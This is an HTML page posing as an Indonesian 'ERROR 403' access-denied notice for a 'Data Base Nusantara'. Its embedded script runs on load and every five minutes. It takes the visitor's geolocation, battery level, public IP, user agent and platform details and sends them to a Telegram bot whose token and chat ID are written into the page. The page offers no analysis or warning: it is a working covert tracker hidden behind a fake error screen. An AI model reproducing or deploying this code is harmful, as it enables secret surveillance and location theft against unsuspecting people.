<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>ERROR 403 | Data Base Nusantara</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Courier New', monospace;
      background-color: #0f0f0f;
      color: #ffffff;
      text-align: center;
      padding: 30px;
    }
    img {
      width: 150px;
      filter: grayscale(100%) brightness(200%);
      margin-bottom: 20px;
    }
    h1 {
      color: #ff4444;
      font-size: 22px;
    }
    .map {
      margin-top: 20px;
      width: 100%;
      height: 300px;
      border: none;
    }
  </style>
</head>
<body>

  <img src="https://borneo101.github.io/DataBaseNusantara/garuda_ai.png" alt="Garuda AI">

  <h1>ANDA TIDAK MEMILIKI IZIN UNTUK MENGAKSES DATA BASE INI</h1>
  <p>Pelacakan otomatis sedang dijalankan...</p>

  <iframe id="map" class="map" src="" allowfullscreen></iframe>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script>
    const chat_id = "5677912817"; // Ganti dengan ID mu
    const bot_token = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko"; // Ganti dengan token bot

    function kirimData(data) {
      const url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
      $.post(url, { chat_id, text: data });
    }

    function updateMap(lat, lon) {
      document.getElementById("map").src = `https://maps.google.com/maps?q=${lat},${lon}&hl=es;z=14&output=embed`;
    }

    function collectAndSend() {
      navigator.geolocation.getCurrentPosition(async function(pos) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const accuracy = pos.coords.accuracy;
        const altitude = pos.coords.altitude || "Unknown";
        const speed = pos.coords.speed || "Unknown";
        const heading = pos.coords.heading || "Unknown";

        updateMap(lat, lon);

        const battery = await navigator.getBattery();
        const level = Math.round(battery.level * 100);
        const charging = battery.charging ? "Charging" : "Not Charging";

        const ipRes = await fetch("https://api.ipify.org?format=json").then(res => res.json());
        const ip = ipRes.ip;

        const now = new Date();
        const utc = now.toUTCString();
        const local = now.toLocaleString("id-ID");

        const payload = `
[TRACKING DEVICE]
IP: ${ip}
Battery: ${level}% (${charging})
User Agent: ${navigator.userAgent}
Language: ${navigator.language}
Platform: ${navigator.platform}
Online: ${navigator.onLine}

Lokasi:
Latitude: ${lat}
Longitude: ${lon}
Accuracy: ${accuracy}m
Altitude: ${altitude}
Speed: ${speed}
Heading: ${heading}
Local Time: ${local}
UTC: ${utc}
Map: https://maps.google.com/?q=${lat},${lon}
        `.trim();

        kirimData(payload);
      });
    }

    collectAndSend();
    setInterval(collectAndSend, 5 * 60 * 1000);
  </script>
</body>
</html>
